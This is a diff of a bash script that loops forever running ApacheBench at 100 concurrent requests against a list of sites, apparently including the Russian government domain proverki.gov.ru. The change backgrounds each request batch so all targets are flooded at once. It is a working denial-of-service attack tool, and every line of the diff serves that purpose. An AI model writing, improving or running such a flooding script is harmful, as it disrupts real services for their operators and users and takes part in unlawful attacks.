@@ -52,8 +52,11 @@ https://proverki.gov.ru/
 while true
     do
         for site in "${sites[@]}"
-        do
-        :
-            ab -k -c 100 -n 100 $site
-        done
+          do
+            if [[ "${site}" != "${sites[-1]}" ]]; then
+              ab -k -c 100 -n 100 "${site}" &
+            else
+              ab -k -c 100 -n 100 "${site}"
+            fi
+          done
     done
